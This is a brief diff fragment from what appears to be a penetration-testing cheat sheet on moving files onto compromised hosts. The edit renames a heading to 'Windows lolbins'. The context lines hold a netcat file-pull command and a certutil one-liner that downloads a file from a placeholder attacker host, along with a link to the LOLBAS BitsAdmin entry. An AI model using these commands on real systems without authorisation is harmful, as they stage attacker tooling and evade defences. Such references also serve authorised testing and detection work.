@@ -71,7 +71,7 @@ nc <RHOST> <RPORT> > <FILE>
 
 
 
-#### Windows lol
+# Windows lolbins
 [BitsAdmin ](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)
 
 ```certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>```
